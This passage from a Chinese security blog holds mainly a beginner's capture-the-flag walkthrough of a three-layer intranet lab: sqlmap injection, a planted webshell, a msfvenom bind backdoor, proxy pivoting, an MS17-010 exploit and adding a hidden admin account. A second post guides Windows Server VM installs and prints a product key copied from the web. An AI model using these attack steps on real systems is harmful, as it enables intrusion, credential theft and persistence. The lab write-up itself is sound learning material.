+<p>use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># proxychains4 nmap -Pn -sT 192.168.22.129 -p80</span></span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230207192941432-1157637333.png"></p>
+<p>能探测乌班图的端口，说明代理配置成功（前面的终端页面都不要关，路由必须设置才可以成功）</p>
+<p>访问80端口开放的http服务，设置好浏览器代理后，访问看看</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207193046411-83145912.png"></p>
+<p>显示站点不存在，ubuntu这个靶机也需要去宝塔，把c段为22的 192.168.236.129添加进去</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207193351255-2116513073.png"></p>
+<h2 id="3-利用bagecms-sql注入漏洞-admin登录后台拿shell"><a href="#3-利用bagecms-sql注入漏洞-admin登录后台拿shell" class="headerlink" title="(3)利用bagecms-sql注入漏洞,admin登录后台拿shell"></a>(3)利用bagecms-sql注入漏洞,admin登录后台拿shell</h2><p>配置完毕后访问，是一个bagecms搭建的平台</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207193433050-1777913500.png"></p>
+<p>源码中给出了sql注入提示：Hint：SQL注入点：&#x2F;index.php?r&#x3D;vul&amp;keyword&#x3D;1<br>&#x2F;robots.txt 也给出了admin登录点 ： &#x2F;admini</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207193543837-1233943256.png"></p>
+<p>靶场，不用在意那么多，直接sqlmap一把梭,因为需要挂代理才能访问到，所以命令前需要加上 proxychains4，同样 sqlmap也可以用参数 –proxy&#x3D;socks5:&#x2F;&#x2F;192.168.236.128:2222<br>keyword为注入点，所以可以在执行时加上 -p keyword 更快一点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆一下数据库名称</span></span><br><span class="line">proxychains4 sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword --dbs</span><br><span class="line">或</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks5://192.168.236.128:2222 -p keyword --dbs --batch</span><br><span class="line"><span class="comment"># 爆破 bagecms 库下的表</span></span><br><span class="line">proxychains4 sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D <span class="string">&quot;bagecms&quot;</span> --tables T <span class="string">&quot;bage_admin&quot;</span> --batch</span><br><span class="line"><span class="comment"># 爆破 bage_admin 表的字段</span></span><br><span class="line">proxychains4 sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D <span class="string">&quot;bagecms&quot;</span> -T <span class="string">&quot;bage_admin&quot;</span> --columns --batch</span><br><span class="line"><span class="comment"># 把 admin的账号密码给 dump出来</span></span><br><span class="line">proxychains4 sqlmap -u <span class="string">&quot;http://192.168.22.22/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword -D bagecms -T bage_admin -C username,password --dump</span><br><span class="line"><span class="comment"># 测试了--is-dba，不是高权限，那就不尝试--os-shell了</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到admin的账号和密码 admin:123qwe</p>
+<p>登录CMS的后台看一看有些什么，&#x2F;index.php?r&#x3D;&#x2F;admini&#x2F;</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207203525139-105740995.png"></p>
+<p>在首页就发现了flag</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207203600343-1988726350.png"></p>
+<p>在模板一栏可以修改文件，在 tag&#x2F;index.php 写入一句话🐎：</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207203807335-98536497.png"></p>
+<p>提交之后，打开蚁剑，设置代理 socks5为 kaliip为192.168.236.128 port为2222</p>
+<p>也可以用 Sockscap挂上msf开启的socks5代理 在里面添加蚁剑程序打开蚁剑</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209173624471-355323214.png"></p>
+<p>注意这里的网址使用的是模块化，不能直接加在网站上，要用?r&#x3D;模块文件 的方式访问模块文件，再用蚁剑连接</p>
+<p>测试连接，写入成功</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207204239372-1742776718.png"></p>
+<h2 id="3-上传msf后门-bind-tcp-正向连接拿ubuntu主机权限"><a href="#3-上传msf后门-bind-tcp-正向连接拿ubuntu主机权限" class="headerlink" title="(3)上传msf后门(bind_tcp)正向连接拿ubuntu主机权限"></a>(3)上传msf后门(bind_tcp)正向连接拿ubuntu主机权限</h2><p>然后和前面target1差不多，msf生成后门，上传到蚁剑 www&#x2F;wwwroot&#x2F;upload那个目录。不能通过wget了，好像是代理设置的原因，我是直接kali里生成，下载到windows上，然后上传文件上传上去的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成一个正向连接后门（因为内网主机无法直接与本机通信，因此无法建立反向连接，需要本机通过代理连接到目标机）</span></span><br><span class="line"><span class="comment"># 蚁剑中 uname -a 可以看到这是一个64位的linux系统</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=3333 -f elf &gt; shell2.elf</span><br><span class="line"><span class="comment"># 后门程序上传之后在Webshell执行命令</span></span><br><span class="line"><span class="built_in">chmod</span> +x shell2.elf</span><br><span class="line">./shell2.elf</span><br></pre></td></tr></table></figure>
+
+<p>在MSF中开启监听，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的</p>
+<p>同样，如果我们要用msf 另起一个终端开启监听，这里要注意，msf新开的终端之前的那个终端的配置都用不了。</p>
+<p>然而这次代理使用的bind_tcp是Target2作为监听，我们要正向连接到内网里的target2，所以不能直接msfconsole打开，msf这里也需要走代理 ，就是在用 proxychains msfconsole来启动msf，再设置payload，设置rhost,lport run 即可开启监听  ……有点套娃</p>
+<p>可以参考这个图好理解一些：</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230210195342275-1756591548.png"></p>
+<p>实际上继续用那个终端就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 本机MSF执行命令</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.22.129</span><br><span class="line">set LPORT 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="comment"># 转化为交互式</span></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line"><span class="comment"># 查看网络信息</span></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>信息搜集，ifconfig看到了c段为33 的ip，还存在一个内网</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207215011982-1742473983.png"></p>
+<p>还有一层内网？ 继续 msf，下面的操作就有点重复之前的操作了 确定内网c段 -&gt; msf添加路由</p>
+<h1 id="Target3"><a href="#Target3" class="headerlink" title="&lt;4&gt;Target3"></a>&lt;4&gt;Target3</h1><h2 id="1-路由信息探测-1"><a href="#1-路由信息探测-1" class="headerlink" title="(1)路由信息探测"></a>(1)路由信息探测</h2><p>与之前一样，我们添加Target3的路由，由于还在那个终端里，auxiliary&#x2F;server&#x2F;socks_proxy正在执行，所以添加了新路由，也就可以访问新路由内网，这里就不用设置代理了，直接添加路由即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过meterpreter添加33网段的路由信息，这样kali与ubuntu就可以互通了</span></span><br><span class="line">run autoroute -s 192.168.33.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209174743751-1252907341.png"></p>
+<p>nmap扫描一下target3靶机开放的服务</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207220310990-1208761757.png"></p>
+<p>能探测乌班图的端口，说明代理配置成功（前面的终端页面都不要关，路由必须设置才可以成功）</p>
+<h2 id="2-利用ms17-010永恒之蓝漏洞拿shell"><a href="#2-利用ms17-010永恒之蓝漏洞拿shell" class="headerlink" title="(2)利用ms17-010永恒之蓝漏洞拿shell"></a>(2)利用ms17-010永恒之蓝漏洞拿shell</h2><p>必须<strong>添加路由</strong>。</p>
+<p>可以看到 target3是 开放着445、3389端口的Win7系统，熟悉的永恒之蓝。msf里现成的ms17-010打一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.33.33</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209175129395-2132008389.png"></p>
+<p>ms17-010漏洞利用成功，shell进入命令行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant</span><br></pre></td></tr></table></figure>
+
+<p>发现网站开启了3389，同时是system权限：</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209175348934-1976554558.png"></p>
+<p>还看见了我们的shell….</p>
+<p>查看账户，直接修改账户密码。利用3389连接 或者 添加一个用户</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user administrator <span class="number">123456</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">net</span> user /add <span class="number">1</span>vxyz <span class="number">123456</span></span><br><span class="line"><span class="built_in">net</span> localgroup administrators /add <span class="number">1</span>vxyz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230207232321559-1718944061.png"></p>
+<p>win+r mstsc 打开远程桌面连接。在SocksCap中运行连接远程桌面程序mstsc.exe才可以，这里我电脑上没找到。还有一种方法</p>
+<p>portfwd端口转发&#x2F;映射</p>
+<p>portfwd add -l 5555 -p 3389 -r 192.168.33.33</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230209181229909-722146111.png"></p>
+<p>Win+r 输入mstsc  </p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209181416494-1120901401.png"></p>
+<p>最后的flag就在这台win7的桌面上，至此靶场打穿，三个flag拿到</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="&lt;5&gt;总结"></a>&lt;5&gt;总结</h1><p>从最初的下载靶机，开启 到现在结束，断断续续统共花费了很多个小时。期间 连开四台虚拟机，有电脑卡的蓝屏动不了关机… 也有对宝塔配置、内网知识的不了解，跟着wp走却访问不了。还有途中不断解决问题时session一直掉，最后一步的远程桌面没打开等等。到后面一步一步啃完，也是学到了很多东西。</p>
+<p>0.0 渗透小白终于打破 天天听说却不知道是什么东西，害怕没搞过搞不下来的想法，打下了第一个简单的内网靶场。后续抽时间继续深入学习，万事开头难，希望是一个好兆头，加油！</p>
+<p>学到用到的一些东西：</p>
+<ul>
+<li>thinkphp-GUI，sqlmap工具</li>
+<li>msf后门制作 &amp; msf 正向反向shell</li>
+<li>路由的概念</li>
+<li>msf内网代理模块 &amp; sockscap64代理工具</li>
+<li>ms17-010漏洞</li>
+<li>跳板攻击之msf-portfwd端口转发</li>
+<li>3389远程桌面登录</li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187908#h2-2">内有靶机环境下载地方</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网靶场</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安装window-server虚拟机详细步骤" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/" target="_blank">安装window server虚拟机详细步骤</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/" class="archive-article-date">
+        <time datetime="2023-09-20T10:21:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>下载操作系统的网站：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a><br>在里面搜索找到对应的操作系统，使用迅雷下载(比网盘快多了🤡)</p>
+<h1 id="Windows-Server-2012-R2"><a href="#Windows-Server-2012-R2" class="headerlink" title="&lt;1&gt; Windows Server 2012 R2"></a>&lt;1&gt; Windows Server 2012 R2</h1><h2 id="1-虚拟机安装"><a href="#1-虚拟机安装" class="headerlink" title="(1) 虚拟机安装"></a>(1) 虚拟机安装</h2><p>右键，新建虚拟机。<br>稍后安装操作系统 -&gt; Microsoft Windows 选择对应版本2012 R2 -&gt; 浏览选择安装的对应位置(尽量别使用默认在c盘) -&gt; 固件类型默认BIOS -&gt; 下面都直接默认 -&gt; 注意选择存储为单个文件 -&gt; CD&#x2F;DVD选中我们下载的.iso镜像文件。<br>启动</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217183801355-1489620665.png"></p>
+<p>点击下一步</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217183910764-1776699509.png"></p>
+<p>选择现在安装</p>
+<p>产品激活密钥网上搜一个：NB4WH-BBBYV-3MPPC-9RCMV-46XCB。 填写后点击下一步</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184214853-1950141491.png"></p>
+<p>选择安装 Windows Server 2012 R2 Standard（带有GUI的服务器），下一步</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184320611-642087740.png"></p>
+<p>接受许可条款</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184357286-1120351287.png"></p>
+<p>选择自定义安装Windows</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184603435-1726653329.png"></p>
+<p>新建、应用</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184622894-1607651709.png"></p>
+<p>确定</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184643803-1198449010.png"></p>
+<p>下一步</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217184711017-61182768.png"></p>
+<p>等待系统安装</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217185012206-2008450444.png"></p>
+<p>设置管理员密码，点完成。</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217185244586-511986455.png"></p>
+<p>注：不要设置的太简单</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217185418946-1733718411.png"></p>
+<p>输入刚才设置的管理员密码，登录系统。</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217185552382-1417174016.png"></p>
+<p>成功登录，安装完毕</p>
+<h2 id="2-安装vmtools"><a href="#2-安装vmtools" class="headerlink" title="(2) 安装vmtools"></a>(2) 安装vmtools</h2><p>VMtools安装时会显示失败，我们需要打上一些补丁。<br>一般要打上KB2919355的补丁。而KB2919355需要打前置补丁KB2919442。<br>KB2919442下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=42153">https://www.microsoft.com/en-us/download/confirmation.aspx?id=42153</a><br>KB2919355下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-CN/download/details.aspx?id=42334">https://www.microsoft.com/zh-CN/download/details.aspx?id=42334</a><br>这里是官网的说明地址，里有下载地址，在虚拟机里IE打开下载下来运行安装就行。<br>如果显示不出来的话，可以直接访问这两个来下载：<br>1、下载 Windows8.1-KB2919442-x64.msu<br><a target="_blank" rel="noopener" href="https://download.microsoft.com/download/C/F/8/CF821C31-38C7-4C5C-89BB-B283059269AF/Windows8.1-KB2919442-x64.msu">https://download.microsoft.com/download/C/F/8/CF821C31-38C7-4C5C-89BB-B283059269AF/Windows8.1-KB2919442-x64.msu</a></p>
+<p>2、下载 Windows8.1-KB2919355-x64.msu<br><a target="_blank" rel="noopener" href="https://download.microsoft.com/download/2/5/6/256CCCFB-5341-4A8D-A277-8A81B21A1E35/Windows8.1-KB2919355-x64.msu">https://download.microsoft.com/download/2/5/6/256CCCFB-5341-4A8D-A277-8A81B21A1E35/Windows8.1-KB2919355-x64.msu</a></p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217192152729-512342722.png"></p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217194409768-1062699407.png"></p>
+<p>最后安装完KB2919355后，重新启动 等配置更新。开机后再根据vmware提示下载vmtools<br><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217194828341-813676842.png"></p>
+<p>成功打开，一直下一步即可。再次重新启动 vmtools生效</p>
+<h1 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="&lt;2&gt; Windows Server 2008 R2"></a>&lt;2&gt; Windows Server 2008 R2</h1><h2 id="1-虚拟机安装-1"><a href="#1-虚拟机安装-1" class="headerlink" title="(1) 虚拟机安装"></a>(1) 虚拟机安装</h2><p>右键，新建虚拟机。<br>稍后安装操作系统 -&gt; Microsoft Windows 选择对应版本2012 R2 -&gt; 浏览选择安装的对应位置(尽量别使用默认在c盘) -&gt; 固件类型默认BIOS -&gt; 下面都直接默认 -&gt; 注意选择存储为单个文件 -&gt; CD&#x2F;DVD选中我们下载的.iso镜像文件。</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217215028192-1453273726.png"></p>
+<p>开启后 选择简体中文，下一步 -&gt; 现在安装 -&gt;  我接受许可条款</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217215215905-420532423.png"></p>
+<p>选择自定义</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217215425374-115671809.png"></p>
+<p>进入磁盘分区，点击新建 应用 现在就开始安装了</p>
+<p><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217215512263-968312633.png"></p>
+<p>安装完后会重启。<br>首次登陆需要设置管理员账户，设置管理员密码</p>
+<blockquote>
+<p>密码必须包含大小写字母、数字，否则达不到Windows server密码安全要求。建议：大小写字母、数字、符号</p>
+</blockquote>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217220008636-540573958.png"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217220141536-2064769830.png"></p>
+<p>成功登录，进入桌面<br><img src="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/3074366-20230217220320808-1677113284.png"></p>
+<p>至此 Window Server 2008 R2 hpc版安装成功</p>
+<h2 id="（2）-安装vmtools"><a href="#（2）-安装vmtools" class="headerlink" title="（2） 安装vmtools"></a>（2） 安装vmtools</h2><p>好像搞不搞没什么必要，不搞了 大家可以搜一搜</p>
+<h1 id="Windows7"><a href="#Windows7" class="headerlink" title="&lt;3&gt; Windows7"></a>&lt;3&gt; Windows7</h1><p>早之前下载的来着，大体过程差不多，就不再重新安装了</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">环境配置</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-第一章-内网渗透基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/09/20/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" target="_blank">第一章-内网渗透基础</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/09/20/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" class="archive-article-date">
+        <time datetime="2023-09-20T10:17:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="&lt;1&gt; 内网基础知识"></a>&lt;1&gt; 内网基础知识</h1><p><strong>内网概述：</strong></p>
+<ul>
